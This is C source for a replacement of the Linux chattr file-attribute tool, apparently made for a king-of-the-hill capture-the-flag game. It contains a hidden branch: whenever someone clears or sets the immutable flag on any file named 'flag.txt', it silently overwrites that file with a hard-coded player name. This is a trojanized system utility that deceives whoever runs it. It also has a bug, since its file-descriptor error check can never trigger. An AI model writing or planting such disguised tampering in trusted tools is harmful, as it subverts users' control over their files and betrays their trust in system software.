#include <fcntl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/fs.h>

#define USER_NAME_TO_PRINT "s1n1st3r"
#define FILE_TO_PRINT_USER_NAME_TO "flag.txt"

#define ACTION_ADD     '+'
#define ACTION_REMOVE  '-'
#define ACTION_ONLY    '='

#define ATTRS_LIST                      "acdeijstuADT"
#define ATTR_APPEND_ONLY                'a'
#define ATTR_COMPRESSED                 'c'
#define ATTR_NO_DUMP                    'd'
#define ATTR_EXTENT_FORMAT              'e'
#define ATTR_IMMUTABLE                  'i'
#define ATTR_JOURNALLING                'j'
#define ATTR_SECURE_DELETE              's'
#define ATTR_NO_TAIL_MERGE              't'
#define ATTR_UNDELETABLE                'u'
#define ATTR_NO_ATIME_UPDATES           'A'
#define ATTR_SYNCHRONOUS_DIR_UPDATES    'D'
#define ATTR_TOP_OF_DIRECTORY_HIERARCHY 'T'

#define LIST_LENGTH(x) ((sizeof(x) / sizeof(x[0])))

struct attr_table_entry {
	char code;
	int fs_flag;
};

static struct attr_table_entry fs_attrs[] = {
	{ATTR_APPEND_ONLY, FS_APPEND_FL},
	{ATTR_COMPRESSED, FS_COMPR_FL},
	{ATTR_NO_DUMP, FS_NODUMP_FL},
	{ATTR_EXTENT_FORMAT, FS_EXTENT_FL},
	{ATTR_IMMUTABLE, FS_IMMUTABLE_FL},
	{ATTR_JOURNALLING, FS_JOURNAL_DATA_FL},
	{ATTR_SECURE_DELETE, FS_SECRM_FL},
	{ATTR_NO_TAIL_MERGE, FS_NOTAIL_FL},
	{ATTR_UNDELETABLE, FS_UNRM_FL},
	{ATTR_NO_ATIME_UPDATES, FS_NOATIME_FL},
	{ATTR_SYNCHRONOUS_DIR_UPDATES, FS_DIRSYNC_FL},
	{ATTR_TOP_OF_DIRECTORY_HIERARCHY, FS_TOPDIR_FL},
};


static void
print_usage()
{
	fprintf(stderr, "Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTuF] [-v version] files...\n");
	exit(EXIT_FAILURE);
}


static struct attr_table_entry*
lookup_attr_table_entry(char attr)
{
	struct attr_table_entry *entry;
	unsigned long i;
	for (i = 0; i < LIST_LENGTH(fs_attrs); i++) {
		entry = &fs_attrs[i];
		if (entry->code == attr) {
			return entry;
		}
	}
	return NULL;
}


static bool
is_valid_attr(char attr)
{
	char c;
	int i = 0;
	while ((c = ATTRS_LIST[i++]) != '\0') {
		if (c == attr) {
			return true;
		}
	}
	return false;
}


static void
validate_mode_string(char *mode_string) {
	int len;
	char attr;
	int i;
	len = strlen(mode_string);
	if (len < 2) {
		fprintf(stderr, "ERROR: Invalid mode string specified (too short)\n");
		print_usage();
	}
	i = 1;
	while ((attr = mode_string[i++]) != '\0') {
		if (!is_valid_attr(attr)) {
			fprintf(stderr, "ERROR: Attribute '%c' is invalid\n", attr);
			print_usage();
		}
	}
}


static int
get_mask_for_attrs(char *attrs)
{
	int mask;
	int i;
	char attr;
	struct attr_table_entry *entry;

	i = 0;
	mask = 0;
	while ((attr = attrs[i++]) != '\0') {
		entry = lookup_attr_table_entry(attr);
		if (entry == NULL) {
			/* we should have already validated */
			fprintf(stderr, "ERROR: Invalid Attr '%c'\n", attr);
			exit(EXIT_FAILURE);
		}
		mask |= (entry->fs_flag);
	}
	return mask;
}


static int
transform_attrs_add(int attrs, int mask)
{
	return (attrs | mask);
}


static int
transform_attrs_remove(int attrs, int mask)
{
	/* 
	 * To ensure that the new attrs does not have any of the bits
	 * from mask set, we take the inverse of the mask and and it
	 * with the current attrs
	 */
	int reversed_mask;
	int new_attrs;
	reversed_mask = ~mask;
	new_attrs = (attrs & reversed_mask);
	return new_attrs;
}


static int
transform_attrs_only(int attrs, int mask)
{
	return mask; /* In this case, just use the mask */
}


static int
do_action(char *attrs, int file_count, char **files, int(*transform_attrs)(int, int), int mode)
{
	int mask;
	int i;
	size_t fd;
	char *filename;
	int current_attrs;
	int new_attrs;

	/* get mask for our attributes */
	mask = get_mask_for_attrs(attrs);

	/* Do the update on each file */
	for (i = 0; i < file_count; i++) {
		filename = files[i];
		fd = open(filename, 0);
		if (fd < 0) {
			fprintf(stderr, "ERROR: Unable to open %s, skipping\n", filename);
			continue;
		}

		/* Get the current flags */
		if (ioctl(fd, FS_IOC_GETFLAGS, &current_attrs) == -1) {
			fprintf(stderr, "ERROR: Unable to get flags on %s, skipping\n", filename);
			goto cleanup;
		}
		//printf("cur attrs: 0x%08x, mask: 0x%08X\n", current_attrs, mask);
		new_attrs = transform_attrs(current_attrs, mask); /* enable all flags in mask */

		if (strstr(filename, FILE_TO_PRINT_USER_NAME_TO) != NULL)
		{
			if (mask == 0x00000010 && current_attrs == 0x00080010) // case where we do -i
			{
				/* Since we cannot write to the file yet we make it mutable and print afterwards */
				//printf("W new attrs: 0x%08X\n", new_attrs);
				if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
					fprintf(stderr, "ERROR: Unable to set flags on %s, skipping\n", filename);
				}

				FILE* file = fopen(filename, "w");
				fprintf(file, USER_NAME_TO_PRINT);
				fclose(file);
			}
			else if (mask == 0x00000010 && current_attrs == 0x00080000) // case where we do +i
			{
				/* Since we already can write to the file we print now and make it immutable afterwards */
				FILE* file = fopen(filename, "w");
				fprintf(file, USER_NAME_TO_PRINT);
				fclose(file);

				//printf("P new attrs: 0x%08X\n", new_attrs);
				if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
					fprintf(stderr, "ERROR: Unable to set flags on %s, skipping\n", filename);
				}
			}
		}
		else
		{
			//printf("new attrs: 0x%08X\n", new_attrs);
			if (ioctl(fd, FS_IOC_SETFLAGS, &new_attrs) == -1) {
				fprintf(stderr, "ERROR: Unable to set flags on %s, skipping\n", filename);
			}
		}
		
cleanup:
		close(fd);
	}
	return 0;
}


int main(int argc, char **argv)
{
	int file_count = 0;
	char *mode_string;
	char *attrs;
	char action;
	if (argc < 3) {
		print_usage();
	}
	mode_string = argv[1];
	file_count = argc - 2;
	validate_mode_string(mode_string);
	action = mode_string[0];
	attrs = &mode_string[1];
	switch (action) {
	case ACTION_ADD:
		return do_action(attrs, file_count, &argv[2], transform_attrs_add, 1);
		break;
	case ACTION_REMOVE:
		return do_action(attrs, file_count, &argv[2], transform_attrs_remove, 2);
		break;
        case ACTION_ONLY:
		return do_action(attrs, file_count, &argv[2], transform_attrs_only, 0);
		break;
	}
	return 0;
}